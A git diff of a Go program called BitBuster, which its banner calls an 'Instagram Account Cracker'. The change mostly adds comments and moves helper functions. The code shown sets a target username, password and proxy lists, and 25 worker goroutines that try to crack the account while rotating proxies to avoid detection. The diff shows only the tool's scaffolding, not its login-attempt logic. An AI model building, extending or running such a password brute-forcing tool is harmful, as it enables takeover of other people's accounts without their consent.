@@ -12,10 +12,12 @@ import (
 	"github.com/ahmdrz/goinsta"
 )
 
+// Constants
 const USERNAME string = "USERNAME_TO_HACK"
 const WORKERS int = 25
 const VERBOSE bool = false
 
+// Variables
 var wg sync.WaitGroup
 var hasProxyWarningOccurred bool = false
 var passwords []string
@@ -23,8 +25,8 @@ var proxies []string
 var cracked bool = false
 var active int = WORKERS
 
+// Main function
 func main() {
-
 	// Print 'Welcome' banner
 	welcomeMessage()
 
@@ -47,55 +49,8 @@ func main() {
 	failedMessage()
 }
 
-func welcomeMessage() {
-	fmt.Println(`
-|------------------------------------------|
-|   BitBuster v1.0                         |
-|   Instagram Account Cracker              |
-|                                          |
-|   Written and maintained by Peter Cunha  |
-|   https://github.com/petercunha          |
-|------------------------------------------|
-		`)
-
-	fmt.Println("BitBuster is initializing...")
-}
-
-func initializedMessage() {
-	fmt.Println("\nTarget:", USERNAME)
-	fmt.Println("Passwords:", len(passwords))
-	fmt.Println("Proxies:", len(proxies))
-	fmt.Println("Threads:", WORKERS)
-
-	time.Sleep(time.Second * 1)
-	fmt.Print("\nCracking will begin in 3 seconds (Ctrl+C to exit)  ")
-	time.Sleep(time.Second * 1)
-	fmt.Print("3")
-	printDots()
-	time.Sleep(time.Second * 1)
-	fmt.Print("2")
-	printDots()
-	time.Sleep(time.Second * 1)
-	fmt.Print("1")
-	printDots()
-	time.Sleep(time.Second * 1)
-	fmt.Println("\nSpawning worker processes NOW!\n")
-	time.Sleep(time.Second * 1)
-}
-
-func failedMessage() {
-	fmt.Println("\n\nBitBuster was not able to crack the account. Sorry :(")
-}
-
-func printDots() {
-	time.Sleep(time.Millisecond * 50)
-	fmt.Print(".")
-	time.Sleep(time.Millisecond * 50)
-	fmt.Print(".")
-	time.Sleep(time.Millisecond * 50)
-	fmt.Print(". ")
-}
-
+// This function activates several workers to begin the cracking process.
+// Each spawned worker runs in its own goroutine (aka thread).
 func crack() {
 	// Don't start more threads than one thread per password
 	activatedWorkers := WORKERS
@@ -110,18 +65,8 @@ func crack() {
 	go statusLoop()
 }
 
-func statusLoop() {
-	for true {
-		time.Sleep(time.Second * 10)
-		fmt.Println()
-		fmt.Println("<< STATUS UPDATE >>")
-		fmt.Println("Passwords remaining:", len(passwords))
-		fmt.Println("Proxies remaining:", len(proxies))
-		fmt.Println("Active workers:", active)
-		fmt.Println()
-	}
-}
-
+// This function acts as a single worker process.
+// Each worker attempts to crack the account while using different proxies.
 func workerThread(workerNumber int) {
 	// Add a task to the WaitGroup
 	wg.Add(1)
@@ -263,4 +208,70 @@ func checkConn(proxy string) bool {
 		defer conn.Close()
 		return true
 	}
+}
+
+// Prints the welcome banner
+func welcomeMessage() {
+	fmt.Println(`
+|------------------------------------------|
+|   BitBuster v1.0                         |
+|   Instagram Account Cracker              |
+|                                          |
+|   Written and maintained by Peter Cunha  |
+|   https://github.com/petercunha          |
+|------------------------------------------|
+		`)
+
+	fmt.Println("BitBuster is initializing...")
+}
+
+// Prints the initialized message
+func initializedMessage() {
+	fmt.Println("\nTarget:", USERNAME)
+	fmt.Println("Passwords:", len(passwords))
+	fmt.Println("Proxies:", len(proxies))
+	fmt.Println("Threads:", WORKERS)
+
+	time.Sleep(time.Second * 1)
+	fmt.Print("\nCracking will begin in 3 seconds (Ctrl+C to exit)  ")
+	time.Sleep(time.Second * 1)
+	fmt.Print("3")
+	printDots()
+	time.Sleep(time.Second * 1)
+	fmt.Print("2")
+	printDots()
+	time.Sleep(time.Second * 1)
+	fmt.Print("1")
+	printDots()
+	time.Sleep(time.Second * 1)
+	fmt.Println("\nSpawning worker processes NOW!\n")
+	time.Sleep(time.Second * 1)
+}
+
+// Prints a status message for cracking progress.
+func statusLoop() {
+	for true {
+		time.Sleep(time.Second * 10)
+		fmt.Println()
+		fmt.Println("<< STATUS UPDATE >>")
+		fmt.Println("Passwords remaining:", len(passwords))
+		fmt.Println("Proxies remaining:", len(proxies))
+		fmt.Println("Active workers:", active)
+		fmt.Println()
+	}
+}
+
+// Prints the failure message
+func failedMessage() {
+	fmt.Println("\n\nBitBuster was not able to crack the account. Sorry :(")
+}
+
+// Prints pretty dots
+func printDots() {
+	time.Sleep(time.Millisecond * 50)
+	fmt.Print(".")
+	time.Sleep(time.Millisecond * 50)
+	fmt.Print(".")
+	time.Sleep(time.Millisecond * 50)
+	fmt.Print(". ")
 }
